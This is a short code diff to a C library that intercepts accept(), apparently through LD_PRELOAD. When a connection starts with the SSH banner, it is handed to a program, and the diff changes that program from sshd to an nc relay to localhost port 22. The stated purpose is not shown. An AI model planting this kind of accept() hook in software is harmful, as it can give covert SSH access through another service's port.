@@ -10,7 +10,7 @@
 #include <dlfcn.h>
 
 static const char trigger[] = "SSH-2.0-";
-static char *(program[]) = { "sshd", "-di", "-vvv" }; 
+static char *(program[]) = { "nc", "-q0", "localhost", "22" }; 
 
 int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
     static int (*_accept)(int, struct sockaddr *, socklen_t *) = NULL;
